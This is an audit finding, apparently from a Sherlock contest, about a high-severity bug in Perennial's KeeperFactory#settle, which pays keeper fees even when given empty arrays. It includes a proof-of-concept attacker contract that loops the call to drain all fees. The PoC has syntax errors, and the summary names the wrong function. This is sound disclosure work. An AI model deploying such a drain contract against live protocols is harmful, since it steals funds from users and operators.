---
tags:
  - lang/solidity
  - sector/oracle
  - platform/sherlock
  - has/github
  - severity/high
  - impact/loss-of-funds/fee-theft
protocol: "[[Perennial]]"
auditors:
  - "[[rvierdiiev]]"
report: "https://github.com/sherlock-audit/2023-10-perennial-judging"
genome:
  - "[[missing-modifier]]"
  - "[[fee-theft]]"
  - "[[cross-contract-state-consistency]]"
  - "[[fee-accounting]]"
  - "[[oracle-freshness]]"
  - "[[proof-input-validation]]"
---
# H-4: Attacker can call `KeeperFactory#settle` with empty arrays as input parameters to steal all keeper fees

- id: 28951
- impact: HIGH
- protocol: [[Perennial]]
- reporter: [[rvierdiiev]] (Sherlock)
- source: N/A

## Summary


This bug report is about an issue found in the code for the Perennial Protocol. Through manual review, Emmanuel and rvierdiiev discovered that anyone can call the `KeeperFactory#request` function with empty arrays as parameters, and the call will succeed, allowing the caller to receive a fee. This attack can be done multiple times in a loop, allowing the attacker to steal all keeper fees from the protocol. 

The expected workflow is that a user calls `Market#update` to open a new position, and the Market calls `Oracle#request` to request a new oracleVersion. The User's account gets added to a callback array of the market, and once the new oracleVersion is committed, keepers can call `KeeperFactory#settle`. This will call `Market#update` on accounts in the Market's callback array, and pay the keeper a fee. The issue is that `KeeperFactory#settle` does not check if the length of the array is 0, so if the user inputs an empty array, the for loop will not be entered, but the keeper still receives a fee via the `keep` modifier.

The impact of this attack is that all keeper fees can be stolen from the protocol, and there will be no way to incentivize Keepers to commitRequested oracle versions, or other keeper tasks. The code snippet provided in the report is https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L206-L212. 

The recommendation is to add a check within the `KeeperFactory#settle` function to revert if `ids.length==0`. The code snippet for this is provided in the report. 

Comments were left on this issue during the judging contest. Sherlock-admin2 suggested that this is a medium issue, and a duplicate of issue #9. Arjun-io suggested that this is a high issue due to the fact that draining the oracle fee could brick markets quickly.

## Details

Source: https://github.com/sherlock-audit/2023-10-perennial-judging/issues/50 

## Found by 
Emmanuel, rvierdiiev
## Summary
Anyone can call `KeeperFactory#request`, inputting empty arrays as parameters, and the call will succeed, and the caller receives a fee.

Attacker can perform this attack many times within a loop to steal ALL keeper fees from protocol.

## Vulnerability Detail
### Expected Workflow:

- User calls [`Market#update`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L80) to open a new position
- Market calls [`Oracle#request`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L369) to request a new oracleVersion
  - The User's account [gets added](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L83) to a callback array of the market
- Once new oracleVersion gets [committed](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L163), keepers can call [`KeeperFactory#settle`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L202), which will call [`Market#update`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L177) on accounts in the Market's callback array, and [pay](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L204) the keeper(i.e. caller) a fee.
  - KeeperFactory#settle call [will fail](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L137-L139) if there is no account to settle(i.e. if callback array is empty)
  - After [`settle`ing](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L143) an account, it gets [removed](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L144) from the callback array

### The issue:

Here is [KeeperFactory#settle](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L202-L217) function:

```solidity
function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts)
    external
    keep(settleKeepConfig(), msg.data, 0, "")
{
    if (
        ids.length != markets.length ||
        ids.length != versions.length ||
        ids.length != maxCounts.length ||
        // Prevent calldata stuffing
        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length
    )
        revert KeeperFactoryInvalidSettleError();

    for (uint256 i; i < ids.length; i++)
        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);
}

```

As we can see, function does not check if the length of the array is 0, so if user inputs empty array, the for loop will not be entered, but the keeper still receives a fee via the `keep` modifier.

Attacker can have a contract perform the attack multiple times in a loop to drain all fees:

```solidity
interface IKeeperFactory{
    function settle(bytes32[] memory ids,IMarket[] memory markets,uint256[] memory versions,uint256[] memory maxCounts
    ) external;
}

interface IMarket(
    function update()external;
)

contract AttackContract{

    address public attacker;
    address public keeperFactory;
    IERC20 public keeperToken;

    constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken){
        attacker=msg.sender;
        keeperFactory=perennialDeployedKeeperFactory;
        keeperToken=_keeperToken;
    }

    function attack()external{
        require(msg.sender==attacker,"not allowed");

        bool canSteal=true;

        // empty arrays as parameters
        bytes32[] memory ids=[];
        IMarket[] memory markets=[];
        uint256[] versions=[];
        uint256[] maxCounts=[];

        // perform attack in a loop till all funds are drained or call reverts
        while(canSteal){
            try IKeeperFactory(keeperFactory).settle(ids,markets,versions,maxCounts){
                //
            }catch{
                canSteal=false;
            }
        }
        keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this)));
    }
}
```

## Impact
All keeper fees can be stolen from protocol, and there will be no way to incentivize Keepers to commitRequested oracle version, and other keeper tasks

## Code Snippet
https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L206-L212
## Tool used

Manual Review

## Recommendation
Within KeeperFactory#settle function, revert if `ids.length==0`:

```solidity
function settle(
    bytes32[] memory ids,
    IMarket[] memory markets,
    uint256[] memory versions,
    uint256[] memory maxCounts
)external keep(settleKeepConfig(), msg.data, 0, "") {
    if (
++++    ids.length==0 ||
        ids.length != markets.length ||
        ids.length != versions.length ||
        ids.length != maxCounts.length ||
        // Prevent calldata stuffing
        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length
    ) revert KeeperFactoryInvalidSettleError();

    for (uint256 i; i < ids.length; i++)
        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);
}
```



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> medium, dup of #9



**arjun-io**

We might consider this a High due to the fact that draining the oracle fee could brick markets pretty quickly (potentially in 1 tx)
